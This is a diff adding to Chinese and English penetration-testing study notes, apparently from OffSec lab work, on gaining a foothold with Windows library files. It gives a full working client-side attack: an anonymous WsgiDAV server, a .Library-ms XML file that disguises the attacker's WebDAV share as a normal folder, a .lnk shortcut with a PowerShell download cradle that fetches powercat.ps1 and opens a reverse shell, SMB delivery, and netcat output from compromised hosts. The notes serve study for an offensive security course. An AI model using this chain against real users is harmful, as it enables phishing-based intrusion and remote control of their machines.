@@ -1996,20 +1996,237 @@ PS C:\Users\offsec\Documents>
 
 ### - Obtaining Code Execution via Windows Library Files
 Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares
-#### (1) Windows library files to gain a foothold on the target system
-- 建立 [WebDAV](https://zh.wikipedia.org/zh-tw/WebDAV) 連接共享 Windows library
+#### 1. Windows library files to gain a foothold on the target system
+##### - (1) 建立 [WebDAV](https://zh.wikipedia.org/zh-tw/WebDAV) 連接共享 Windows library
   >[!Note]
-  >`WebDAV` (Web Distributed Authoring and Versioning)\
+  > `WebDAV` (Web Distributed Authoring and Versioning)\
   > 基於 HTTP 協議的擴展，允許 user 遠端上傳、下載、刪除和編輯伺服器上的文件
-- victim 接收開啟 `.Library-ms` file
+            
+(1-1) use [WsgiDAV2](https://wsgidav.readthedocs.io/en/latest/index.html) as the WebDAV server to host and serve our files
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ pip3 install wsgidav        
+Defaulting to user installation because normal site-packages is not writeable
+Collecting wsgidav
+  Downloading WsgiDAV-4.3.3-py3-none-any.whl.metadata (7.0 kB)
+Requirement already satisfied: defusedxml in /usr/lib/python3/dist-packages (from wsgidav) (0.7.1)
+Requirement already satisfied: Jinja2 in /usr/lib/python3/dist-packages (from wsgidav) (3.1.3)
+Collecting json5 (from wsgidav)
+  Downloading json5-0.10.0-py3-none-any.whl.metadata (34 kB)
+Requirement already satisfied: PyYAML in /usr/lib/python3/dist-packages (from wsgidav) (6.0.1)
+Downloading WsgiDAV-4.3.3-py3-none-any.whl (164 kB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 165.0/165.0 kB 578.7 kB/s eta 0:00:00
+Downloading json5-0.10.0-py3-none-any.whl (34 kB)
+Installing collected packages: json5, wsgidav
+  WARNING: The script pyjson5 is installed in '/home/chw/.local/bin' which is not on PATH.
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.
+  WARNING: The script wsgidav is installed in '/home/chw/.local/bin' which is not on PATH.
+  Consider adding this directory to PATH or, if you prefer to suppress this warning, use --no-warn-script-location.                                                                                                         
+Successfully installed json5-0.10.0 wsgidav-4.3.3
+```
+(1-2) 建立`/home/kali/webdav` 包含`.lnk` 檔案的 WebDAV 路徑 。然後在此目錄中放置一個 test.txt 
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ mkdir /home/kali/webdav
+
+┌──(chw㉿CHW-kali)-[~]
+└─$ touch /home/kali/webdav/test.txt         
+```
+(1-3) 啟動 WebDAV 伺服器
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ /home/chw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/chw/webdav/
+Running without configuration file.
+15:47:54.307 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
+15:47:54.308 - INFO    : WsgiDAV/4.3.3 Python/3.11.9 Linux-6.8.11-arm64-aarch64-with-glibc2.38
+15:47:54.308 - INFO    : Lock manager:      LockManager(LockStorageDict)
+15:47:54.308 - INFO    : Property manager:  None
+15:47:54.308 - INFO    : Domain controller: SimpleDomainController()
+15:47:54.308 - INFO    : Registered DAV providers by route:
+15:47:54.308 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/chw/.local/lib/python3.11/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
+15:47:54.308 - INFO    :   - '/': FilesystemProvider for path '/home/chw/webdav' (Read-Write) (anonymous)
+15:47:54.308 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
+15:47:54.308 - WARNING : Share '/' will allow anonymous write access.
+15:47:54.308 - WARNING : Share '/:dir_browser' will allow anonymous write access.
+15:47:54.336 - INFO    : Running WsgiDAV/4.3.3 Cheroot/10.0.0 Python/3.11.9
+15:47:54.336 - INFO    : Serving on http://0.0.0.0:80 ...
+            
+```
+> 1. 從 `/home/chw/.local/bin/wsgidav` 目錄執行 WsgiDAV
+> 2. `--host=0.0.0.0`: 伺服器會綁定在所有網路端口上，允許來自任何 IP 地址的連線
+> 3. specify the listening port with `--port=80`
+> 4. `--auth=anonymous`: 使用匿名驗證，不需要用戶名或密碼即可訪問
+> 5. 指定 WebDAV 伺服器的根目錄為 `/home/chw/webdav/` (剛剛創建的惡意路徑)
+
+![image](https://hackmd.io/_uploads/B1yHPq8r1l.png)
+
+(1-3) 在 window RDP 創建 config.Library-ms
+![image](https://hackmd.io/_uploads/H1DJxjUr1l.png)
+> Save the file with this file extension
+
+(1-4) 創建 file extension 的 XML
+>[!Note]
+> Library files consist of three major parts (`General library information`, `Library properties` & `Library locations`)and are written in XML to specify the parameters for accessing remote locations.\
+> [Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
+
+- 定義 XML 文件基本資訊
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+
+</libraryDescription>
+```
+> 使用了屬於 Windows Library 的 library file format http://schemas.microsoft.com/windows/2009/library
+- Library 的基本資訊
+```xml
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+```
+> XML and Library Description Version\
+> `windows.storage.dll,-34582`: 表示一個系統定義的名稱，會被解析為「文件」的名稱。
+- 設定 library 的其他屬性
+`isLibraryPinned`:  設定此 Library 是否要固定在 Windows Explorer 的側邊導航欄中，設為 true 表示會固定\
+`iconReference`: what icon is used to display the library file.
+```xml
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+```
+> Configuration for Navigation Bar Pinning and Icon\
+> `imageres.dll,-1003`: 指定一個系統內建的「圖片」資料夾 icon
+
+- 設定 folderType 與顯示 templateInfo tags
+```xml
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+```
+> `templateInfo`：指定檔案總管打開 Library 時會使用的顯示模板\
+>`folderType`：指定 GUID（唯一識別碼）對應的資料夾類型\
+>例如：{7d49d726-3c21-4f05-99aa-fdc2c9474656} 表示「文件」類型，預設會顯示文件相關的列，例如名稱、日期等。            
+
+- 指定 Library 的位置
+
+```xml
+<searchConnectorDescriptionList>
+    <searchConnectorDescription>
+        <isDefaultSaveLocation>true</isDefaultSaveLocation>
+        <isSupported>false</isSupported>
+        <simpleLocation>
+            <url>http://192.168.119.2</url>
+        </simpleLocation>
+    </searchConnectorDescription>
+</searchConnectorDescriptionList>
+```
+> `searchConnectorDescriptionList`：列出此 Library 中的所有 searchConnector
+>> `searchConnectorDescription`：設定單個連接器的細節\
+>> `isDefaultSaveLocation`：指定是否將此位置作為預設的儲存位置，設為 true 表示啟用\
+>> `isSupported`：不在官方文檔中，但可以設定為 false，通常用於兼容性處理\
+>> `<simpleLocation>` 和 `<url>`：指定遠端資源的位置。在這裡，http://192.168.218.129 是目標的 WebDAV 伺服器 URL。
+
+            
+            
+```XML=
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+    <name>@windows.storage.dll,-34582</name>
+    <version>6</version>
+    <isLibraryPinned>true</isLibraryPinned>
+    <iconReference>imageres.dll,-1003</iconReference>
+    <templateInfo>
+        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+    </templateInfo>
+    <searchConnectorDescriptionList>
+        <searchConnectorDescription>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <isSupported>false</isSupported>
+            <simpleLocation>
+                <url>http://192.168.218.129</url>
+            </simpleLocation>
+        </searchConnectorDescription>
+    </searchConnectorDescriptionList>
+</libraryDescription>
+```
+![image](https://hackmd.io/_uploads/H1gbw0qByg.png)
+> 以上可以用於自動化連接遠端資源，並在系統中偽裝成看似正常的資料夾
+
+##### - (2) victim 接收開啟 `.Library-ms` file
   >[!Note]
   > `.Library-ms` file\
   > .Library-ms 是 Windows 函式庫的文件格式，用於將多個資料夾整合成虛擬目錄
   >> 以下要透過 自訂義的`.Library-ms`，指向遠端 WebDAV 共享目錄，讓 victim 存取目錄。
-  
-- 將 payload 塞入 `.lnk` shortcut，victim 點擊觸發 PowerShell reverse shell
 
+![image](https://hackmd.io/_uploads/BJgf509HJg.png)
+> 成功遠端存取 WebDAV share\
+> The path in the navigation bar only `shows config without any indication` that this is actually a remote location. This makes it a perfect first stage for our client-side attack.
+
+重新打開 `.library-ms` 文件後，發現 XML 中出現了新的 serialized 標籤，並且 url 的值由 http://192.168.218.129 變為 \\192.168.218.129\DavWWWRoot。\
+• 原因：Windows 自動優化 WebDAV 連接，對應其內建的 WebDAV 客戶端。\
+• 問題：變更內容可能導致文件在其他機器或重啟後無法正常運作，最終讓攻擊失敗。
+
+>[!Important]
+> The goal is to start a reverse shell by putting the `.lnk` shortcut file on the WebDAV share for the victim to execute
+
+(2-1) 在桌面上建立新的 .link
+(桌面點擊右鍵: Create Shortcut)
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
+```
+> Download Cradle and PowerCat Reverse Shell Execution\
+> 與前面使用的 Ｗindows reverse shell 方法相同
+
+![image](https://hackmd.io/_uploads/rJjKl1jSkg.png)
+> In the next window, let's enter **automatic_configuration** as the name for the shortcut file and click Finish to create the file.
+##### - (3) 將 payload 塞入 `.lnk` shortcut，victim 點擊觸發 PowerShell reverse shell
+
+>[!Important]
+> 缺點： **需要提供 web link（via E-mail**）\
+> 會導致在送到 victim 前，已經被 Mail spam filters 過濾掉
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0>
+```
+
+#### 2. use the foothold to provide an executable file
+Let's copy `automatic_configuration.lnk` and `config.Library-ms` to our WebDAV directory on our Kali machine.
+- send the library file via email 
+- use the \\192.168.50.195\share SMB share to simulate the delivery step
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ cd webdav
+
+┌──(chw㉿CHW-kali)-[~/webdav]
+└─$ rm test.txt
+
+┌──(chw㉿CHW-kali)-[~/webdav]
+└─$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
+Password for [WORKGROUP\chw]:
+putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
+
+```
             
-#### (2) use the foothold to provide an executable file
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
 
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
+whoami
+hr137\hsmith
+```
 
